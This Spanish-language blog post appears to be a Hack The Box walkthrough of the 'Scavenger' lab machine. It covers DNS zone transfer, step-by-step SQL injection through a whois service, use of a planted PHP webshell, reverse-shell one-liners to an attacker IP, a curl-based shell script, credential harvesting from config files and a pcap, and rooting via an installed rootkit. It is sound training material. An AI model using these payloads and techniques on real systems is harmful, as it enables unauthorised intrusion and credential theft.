---
layout: post
title: HTB_Scavenger
date: 2023/07/10
slug: HTB_Scavenger
heroImage: /assets/machines.jpg
---

# Scavenger {-}

## Introduccion {-}

La maquina del dia 29/07/2021 se llama Scavenger
.

El replay del live se puede ver aqui

[![S4vitaar Scavenger maquina](https://img.youtube.com/vi/U5QLCweacCY/0.jpg)](https://www.youtube.com/watch?v=U5QLCweacCY)

No olvideis dejar un like al video y un comentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.155
```
ttl: 63 -> maquina linux. 
Recuerda que tratandose de ttl, 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.155 
```

Si consideras que va muy lento puedes meter los siguientes parametros para que valla mucho mas rapido

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.155 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p20,21,22,25,43,53,80 10.10.10.155 -oN targeted
```

| Puerto | Servicio | Que se nos occure?                                       | Que falta?           |
| ------ | -------- | -------------------------------------------------------- | -------------------- |
| 20     | ftp-data |                                                          |                      |
| 21     | ftp      | conectar como anonymous                                  |                      |
| 22     | ssh      | conexion directa                                         | usuario y contraseña |
| 25     | smtp     | email -> exim                                            | usuario y contraseña |
| 43     | whois    | SUPERSECHOSTING WHOIS (http://www.supersechosting.htb)   |                      |
| 53     | domain   | Domain zone transfer -> attacke de transferencia de zona |                      |
| 80     | http     | con el puerto 53 pensamos en virt hosting                |                      |


### Connectar al ftp como anonymous {-}

```bash
ftp 10.10.10.155
Name: anonymous
password: <enter>
#Output
530 Login incorrect.
```

No nos deja entrar como anonymous

### Analyzando la web {-}

#### Checkeamos la web port el ip {-}

Hablan de virtualhosting

```bash
nano /etc/hosts
```

![scaveer-hosts1](/assets/images/scavenger-hosts1.png) 
Intentamos conectarnos otra vez a la web pero ahora con el url 
```bash
 http://supersechosting.htb 
```
 y tenemos el mismo resultado.






## Evaluacion de vulnerabilidades {-}

### Ataque de transferencia de zona {-}

Para hacer ataques de transferencia de zona, utilizamos la herramienta **Dig** (que no hay que confundir con Dick ;)...)

1. Controlar que la resolucion de dominio funciona

    ```bash
    dig @10.10.10.155 supersechosting.htb
    ```

1. Como la resolucion funciona vamos a transmitir peticiones dns

    ```bash
    dig @10.10.10.155 supersechosting.htb ns
    dig @10.10.10.155 supersechosting.htb mx
    ```

1. Ejecutamos el ataque de transferencia de zona

    ```bash
    dig @10.10.10.155 supersechosting.htb axfr
    ```

Aqui vemos que es vulnerable y vemos unos dominios 

    - root.supersechosting.htb
    - ftp.supersechosting.htb
    - whois.supersechosting.htb
    - www.supersechosting.htb
    - mail1.supersechosting.htb
    - ns1.supersechosting.htb

Los añadimos al 
```bash
 /etc/hosts 
```


```{r, echo = FALSE, fig.cap="hosts despues del domain transfer attack", out.width="90%"}
    knitr::include_graphics("images/scavenger-hosts2.png")

![scaveer-hosts2](/assets/images/scavenger-hosts2.png) 
#### Whois {-}

Como el puerto 43 esta abierto. podemos intentar conectar con la maquina para entablar peticiones whois.

```bash
nc 10.10.10.155 43
EEEE
#Output
% SUPERSECHOSTING WHOIS server v0.5beta@MariaDB10.1.37
% This query returned 0 object
```

Como vemos que MariaDB esta por detras intentamos ponerle una comilla

```bash
nc 10.10.10.155 43
'
#Output
% SUPERSECHOSTING WHOIS server v0.5beta@MariaDB10.1.37
1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB...
```

### SQL Injection por Whois {-}

Como el mensaje nos da 
```bash
 the right syntax to use near "''") 
```
 ya vemos como podemos montarnos el ataque.

```bash
nc 10.10.10.155 43
') ORDER BY 100#
#Output
Unknown column '100' in 'order clause'
```

Como vemos que no puede ordenarnos la query por la columna 100 quiere decir que no hay 100 columnas. Investigamos 
para encontrar cuantas columnas hay.

```bash
nc 10.10.10.155 43
') ORDER BY 4#
#Output
Unknown column '4' in 'order clause'

nc 10.10.10.155 43
') ORDER BY 3#
#Output
Unknown column '3' in 'order clause'

nc 10.10.10.155 43
') ORDER BY 2#
#Output
% This query returned 0 object
```

Ya vemos aqui que hay dos columnas. Podemos aplicar un **UNION SELECT** para ver las etiquetitas a traves de las cuales
podemos injectar los datos con queries.

```bash
nc 10.10.10.155 43
') union select 1,2#
#Output
% This query returned 1 object
1
```

Vemos aqui que injectaremos por la data 1.

1. Qual es la base de datos

    ```bash
    nc 10.10.10.155 43
    ') union select database(),2#
    #Output
    % This query returned 1 object
    whois
    ```

1. Qual es la version

    ```bash
    nc 10.10.10.155 43
    ') union select version(),2#
    #Output
    % This query returned 1 object
    10.1.37-MariaDB-0
    ```

1. Qual son las tablas de la base de datos whois

    ```bash
    nc 10.10.10.155 43
    ') union select table_name,2 from information_schema.tables where table_schema = "whois"#
    #Output
    % This query returned 1 object
    customers
    ```

1. Qual son las columnas de la tabla customers

    ```bash
    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers"#
    #Output
    % This query returned 3 object
    iddomaindata
    ```

    Aqui podria ser turbio y puede ser mejor de enumerar columnas por columnas

    ```bash
    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers" limit 0,1#
    #Output
    % This query returned 1 object
    id

    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers" limit 1,1#
    #Output
    % This query returned 1 object
    domain

    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers" limit 2,1#
    #Output
    % This query returned 1 object
    data
    ```

1. Enumerar lo que hay a dentro de la columna domain

    ```bash
    nc 10.10.10.155 43
    ') union select domain,2 from customers#
    #Output
    % This query returned 4 object
    supersechosting.htbjustanotherblog.htbpwnhats.htbrentahacker.htb
    ```

    Aqui tambien se podria hacer un limit 0,1 1,1 etc...


Ya podemos añadir estos dominios en el 
```bash
 /etc/hosts 
```
.

```{r, echo = FALSE, fig.cap="hosts despues del sqli", out.width="90%"}
    knitr::include_graphics("images/scavenger-hosts3.png")
```

### Ataque de transferencia de zona Part 2 {-}
![scaveer-hosts3](/assets/images/scavenger-hosts3.png) 

```bash
dig @10.10.10.155 justanotherblog.htb axfr
dig @10.10.10.155 pwnhats.htb axfr
dig @10.10.10.155 rentahacker.htb axfr
```

El ultimo dominio nos muestra un dominio turbio 
```bash
 sec03.rentahacker.htb 
```
. Lo añadimos nuevamente en el 
```bash
 /etc/hosts 
```
 y por firefox
nos conectamos. Por fin algo nuevo.

Esta pagina nos hace pensar que gente ya a hackeado la pagina por otros *Haxxors*. Si es el caso, fuzzeamos la pagina.

### Web Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/FUZZ
```

Aqui hay un poco de todo. Intentamos fuzzear por archivos **PHP**

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/FUZZ.php
```

Ya encontramos un fichero **shell.php**. Visitamos la pagina por firefox y efectivamente parece una shell pero no tenemos el nombre
del comando usado para ejecutar los comandos. Lo buscamos con **WFUZZ** diciendole de ocultar las respuestas que retornan 0 palabras.

```bash
wfuzz -c -t 200 --hc=404 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/shell.php?FUZZ=whoami
```

encontramos el comando 
```bash
 hidden 
```




## Explotacion de vulnerabilidad & Ganando acceso {-}

### Crear una reverse shell desde la webshell {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. En la web

    ```bash
    http://sec03.rentahacker.htb/shell.php?hidden=nc -e /bin/bash 10.10.14.20 443
    http://sec03.rentahacker.htb/shell.php?hidden=bash -i >& /dev/tcp/10.10.14.20/443 0>&1
    http://sec03.rentahacker.htb/shell.php?hidden=bash -c "bash -i >& /dev/tcp/10.10.14.20/443 0>&1"
    http://sec03.rentahacker.htb/shell.php?hidden=bash -c 'bash -i >& /dev/tcp/10.10.14.20/443 0>&1'
    http://sec03.rentahacker.htb/shell.php?hidden=whoami | nc 10.10.14.20 443
    ```

Como aqui vemos que nada functionna, pensamos que hay reglas que son definidas en el *iptables*

### Creamos una FakeShell {-}

En el directorio exploits creamos un fichero 
```bash
 fakeShell.sh 
```
 que contiene

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# Variables globales
declare -r main_url="http://sec03.rentahacker.htb/shell.php"

while true; do
    echo -n "[~] " && read -r command
    echo; curl -s -X GET -G $main_url --data-urlencode "hidden=$command"; echo
done
```

Ya lo podemos lanzar con el comando 
```bash
 rlwrap ./fakeShell.sh 
```


> [ ! ] Notas: Las explicaciones del script se pueden ver en el video live en el minuto 1:15:38

Tambien se podria utilizar la herramienta creada por s4vitar [ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)

### Enumeramos el equipo {-}

```bash
ls -l /home
whoami
ls -l /home/ib01c03
ls wp-config.php
find \-name wp-config.php
find / \-name wp-config.php
cat /home/ib01c03/www/wp-config.php
```

Vemos un fichero comprimido de wordpress. Buscamos el fichero de configuracion de wordpress que suele tener credenciales en
texto claro. Una vez encontrado lo miramos con 
```bash
 cat 
```
. Encontramos usuario y contraseña para el servicio mysql. Aqui no hay nada interesante.

### Chequeamos ficheros del servicio SMTP {-}

Los ficheros de email suelen ser guardados en el 
```bash
 /var/spool/mail 
```
. Aqui vemos dos ficheros y une tiene credenciales para el **FTP** en texto claro.

### Conexion por ftp {-}

```bash
ftp 10.10.10.155
Name: ib01ftp
Password: 
```

ya hemos podido entrar en la maquina. Vemos archivos y nos los descargamos a la maquina de atacante

```bash
binary
prompt off
mget *
```

Hay ficheros interesantes como 
```bash
 notes.txt 
```
 o 
```bash
 ib01c01.access.log 
```
 que nos dan pistas pero nosotros vamos a por el fichero 
```bash
 ib01c01_incident.pcap 
```


### Investigamos el fichero pcap con TShark {-}

```bash
tshark -r ib01c01_incident.pcap
tshark -r ib01c01_incident.pcap -Y "http.request.method==POST" 2>/dev/null
tshark -r ib01c01_incident.pcap -Y "http.request.method==POST" -Tjson 2>/dev/null
tshark -r ib01c01_incident.pcap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
```

Analizando aqui encontramos passwords que son codeadas en url-encode. Tratamos de conectar con el usuario de estos ficheros 
```bash
 ib01c01 
```
 con la 
nueva contraseña y pa dentro. Ya podemos ver el fichero **user.txt**

### Continuacion de la investigacion con Wireshark {-}

Aqui llegamos a una parte bastante complicada de explicar por escrito. Mejor verlo directamente con el video desde el minuto 1:40:45
De echo esta parte explica como encuentra un modulo rootkit en el sistema y explica como tratarla.




## Escalada de privilegios {-}

### Rootear la maquina {-}

La escalada de privilegio aqui se hace utilizando el rootkit.


```bash
ls -l /dev/ttyR0
```

Aqui vemos que el rootkit esta instalado. Continuamos con lo que la web del rootkit nos dice.

```bash
echo "g0tR0ot" > /dev/ttyR0; id
```

Pero no functionna. Pensamos aqui que los atacantes que han instalado el rootkit cambiaron la contraseña.
Segun la web, la contraseña se encuentra en un fichero 
```bash
 root.ko 
```
 y mirandolo bien hay un directorio que se
llama 
```bash
 ... 
```
 (Que cabron)

```bash
cd ...
binary
get root.ko
```

Una vez descargado y como es un binario, tratamos de ver lo que pasa a mas bajo nivel con **radare2**

```bash
radare2 root.ko
aaa
afl
sym.root_write
pdf
```

```{r, echo = FALSE, fig.cap="radare2 root.ko", out.width="90%"}
    knitr::include_graphics("images/radare2rootko.png")
```

Vemos esta parte interesante y probamos una vez mas con:

root
![radare2rootko](/assets/images/radare2rootko.png) 
```

Ya estamos root y podemos ver la flag.